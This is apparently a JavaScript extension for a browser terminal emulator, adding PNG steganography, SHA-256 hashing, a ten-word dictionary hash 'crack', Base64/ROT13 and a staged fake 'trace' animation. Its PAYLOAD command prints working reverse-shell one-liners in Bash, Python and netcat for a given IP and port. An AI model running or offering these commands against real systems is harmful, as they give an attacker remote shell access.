(function () {
  'use strict';
  const T = Terminal;

  async function loadImageFromVFS(session, path) {
    const target = T.Utils.resolvePath(session.cwd, path);
    const entry = await T.Storage.get(target, 'vfs');

    if (!entry || entry.type !== 'file' || !entry.isBinary) {
      throw new Error('Image file not found or invalid at ' + target);
    }

    let dataUrl;
    if (entry.content instanceof Blob) {
      dataUrl = await new Promise((resolve, reject) => {
        const reader = new FileReader();
        reader.onloadend = () => resolve(reader.result);
        reader.onerror = () => reject(new Error('Failed to read image blob.'));
        reader.readAsDataURL(entry.content);
      });
    } else if (typeof entry.content === 'string') {
      const m = target.match(/\.(png|jpe?g|gif|bmp|webp)$/i);
      const mime = m ? 'image/' + m[1].toLowerCase().replace('jpg', 'jpeg') : 'image/png';
      dataUrl = 'data:' + mime + ';base64,' + entry.content;
    } else {
      throw new Error('Unsupported image format.');
    }

    const img = new Image();
    await new Promise((resolve, reject) => {
      img.onload = resolve;
      img.onerror = () => reject(new Error('Failed to decode image format.'));
      img.src = dataUrl;
    });
    return { img, dataUrl };
  }

  async function sha256(text) {
    const buf = new TextEncoder().encode(text);
    const hash = await crypto.subtle.digest('SHA-256', buf);
    return Array.from(new Uint8Array(hash)).map(b => b.toString(16).padStart(2, '0')).join('');
  }

  async function cinematicTrace(session, target) {
    const lines = [
      '[*] Initializing connection to ' + target + '...',
      '[*] Resolving DNS... Found IP: 192.168.1.104',
      '[*] Bypassing firewall (Port 22, 80, 443)...',
      '[*] Injecting payload...',
      '[+] Access Granted. Root shell obtained.'
    ];
    for (const line of lines) {
      await new Promise(r => setTimeout(r, 800));
      if (line.startsWith('[+]')) session.printSuccess(line);
      else session.printSystem(line);
    }
  }

  T.registerExtension({
    name: 'kal',
    info: 'Steganography + Cyber Security Suite loaded.',
    descriptions: {
      HIDE:    'Hide text in PNG (HIDE <file.png> <text>)',
      SEEK:    'Extract hidden text (SEEK <file.png>)',
      HASH:    'SHA-256 hash (HASH <text>)',
      CRACK:   'Dictionary attack (CRACK <hash>)',
      CIPHER:  'Base64 + ROT13 (CIPHER <text>)',
      TRACE:   'Cinematic trace (TRACE <ip>)',
      PAYLOAD: 'Reverse shell payload (PAYLOAD <ip> <port>)'
    },
    commands: {
      HIDE: async function (arg) {
        const match = arg.match(/^(\S+)\s+([\s\S]+)$/);
        if (!match) return this.printError('Usage: HIDE <file.png> <secret text>');

        const filename = match[1];
        const text = match[2];
        this.printSystem('Embedding secret text into ' + filename + '...');

        try {
          const { img } = await loadImageFromVFS(this, filename);

          const canvas = document.createElement('canvas');
          canvas.width = img.width;
          canvas.height = img.height;
          const ctx = canvas.getContext('2d');
          ctx.drawImage(img, 0, 0);

          const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
          const data = imageData.data;

          const textBytes = new TextEncoder().encode(text);
          const header = new Uint8Array(4);
          new DataView(header.buffer).setUint32(0, textBytes.length);

          const fullBytes = new Uint8Array(4 + textBytes.length);
          fullBytes.set(header, 0);
          fullBytes.set(textBytes, 4);

          const maxCapacityBytes = Math.floor((data.length * 3) / 8);
          if (fullBytes.length > maxCapacityBytes) {
            return this.printError('Text too large! This image can only hold ' + maxCapacityBytes + ' bytes.');
          }

          let bitIndex = 0;
          for (let i = 0; i < data.length; i++) {
            if (i % 4 === 3) continue;
            if (bitIndex >= fullBytes.length * 8) break;
            const byteIdx = Math.floor(bitIndex / 8);
            const bitOffset = 7 - (bitIndex % 8);
            const bit = (fullBytes[byteIdx] >> bitOffset) & 1;
            data[i] = (data[i] & 0xFE) | bit;
            bitIndex++;
          }

          ctx.putImageData(imageData, 0, 0);

          const base64Data = canvas.toDataURL('image/png').split(',')[1];
          const newName = filename.replace(/\.[^.]+$/, '_secret.png');
          const target = T.Utils.resolvePath(this.cwd, newName);

          const byteCharacters = atob(base64Data);
          const byteNumbers = new Uint8Array(byteCharacters.length);
          for (let i = 0; i < byteCharacters.length; i++) byteNumbers[i] = byteCharacters.charCodeAt(i);
          const blob = new Blob([byteNumbers], { type: 'image/png' });

          await T.Storage.set(target, { type: 'file', content: blob, isBinary: true }, 'vfs');

          this.printSuccess('Secret text hidden successfully!');
          this.printSystem('Saved as: ' + newName);
          this.printSystem('(Note: Do not convert to JPG - LSB data will be destroyed.)');

        } catch (e) {
          this.printError(e.message);
        }
      },

      SEEK: async function (arg) {
        const filename = arg.trim();
        if (!filename) return this.printError('Usage: SEEK <file.png>');
        this.printSystem('Scanning ' + filename + ' for hidden data...');

        try {
          const { img } = await loadImageFromVFS(this, filename);

          const canvas = document.createElement('canvas');
          canvas.width = img.width;
          canvas.height = img.height;
          const ctx = canvas.getContext('2d');
          ctx.drawImage(img, 0, 0);
          const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
          const data = imageData.data;

          const bits = [];
          for (let i = 0; i < data.length; i++) {
            if (i % 4 === 3) continue;
            bits.push(data[i] & 1);
          }

          const bytes = [];
          for (let i = 0; i < bits.length; i += 8) {
            if (i + 8 > bits.length) break;
            let byte = 0;
            for (let j = 0; j < 8; j++) byte = (byte << 1) | bits[i + j];
            bytes.push(byte);
          }

          if (bytes.length < 4) return this.printError('No hidden data found or image is corrupted.');

          const textLength = new DataView(new Uint8Array(bytes.slice(0, 4)).buffer).getUint32(0);
          if (textLength === 0 || textLength > bytes.length - 4) {
            return this.printError('No valid hidden text detected in this image.');
          }

          const textBytes = new Uint8Array(bytes.slice(4, 4 + textLength));
          const hiddenText = new TextDecoder().decode(textBytes);

          this.printSystem('----------------------------------------');
          this.printSuccess('[ HIDDEN TEXT FOUND ]');
          this.print(hiddenText);
          this.printSystem('----------------------------------------');

        } catch (e) {
          this.printError(e.message);
        }
      },

      HASH: async function (arg) {
        if (!arg) return this.printError('Usage: HASH <text>');
        const hash = await sha256(arg);
        this.printSystem('Plaintext: ' + arg);
        this.printSuccess('SHA-256:   ' + hash);
      },

      CRACK: async function (arg) {
        if (!arg) return this.printError('Usage: CRACK <sha256_hash>');
        this.printSystem('Target Hash: ' + arg);
        this.printSystem('Initiating dictionary attack...');
        const dictionary = ['admin', 'password', '123456', 'root', 'hacker', 'secret', 'gojo', 'kalma', 'qwerty', 'letmein'];
        for (const word of dictionary) {
          await new Promise(r => setTimeout(r, 100));
          const hash = await sha256(word);
          if (hash === arg.toLowerCase()) {
            return this.printSuccess('CRACKED! The password is: ' + word);
          }
        }
        this.printError('FAILED. Password not found in dictionary.');
      },

      CIPHER: function (arg) {
        if (!arg) return this.printError('Usage: CIPHER <text>');
        let b64;
        try { b64 = btoa(unescape(encodeURIComponent(arg))); }
        catch (e) { b64 = '[encoding failed]'; }
        const rot13 = arg.replace(/[a-zA-Z]/g, c => {
          return String.fromCharCode((c <= 'Z' ? 90 : 122) >= (c = c.charCodeAt(0) + 13) ? c : c - 26);
        });
        this.printSystem('Original: ' + arg);
        this.printSystem('Base64:   ' + b64);
        this.printSuccess('ROT13:    ' + rot13);
      },

      TRACE: async function (arg) {
        const target = arg || '127.0.0.1';
        this.printSystem('Starting trace route to ' + target + '...');
        await cinematicTrace(this, target);
      },

      PAYLOAD: function (arg) {
        const parts = arg.trim().split(/\s+/);
        const ip = parts[0] || '10.0.0.1';
        const port = parts[1] || '4444';
        this.printSystem('[ Generated Payloads for ' + ip + ':' + port + ' ]');
        this.printSystem('[ Bash (Linux) ]');
        this.printSystem('bash -i >& /dev/tcp/' + ip + '/' + port + ' 0>&1');
        this.printSystem('[ Python ]');
        this.printSystem('python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("' + ip + '",' + port + '));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'');
        this.printSystem('[ Netcat ]');
        this.printSystem('nc -e /bin/sh ' + ip + ' ' + port);
      }
    }
  });
})();
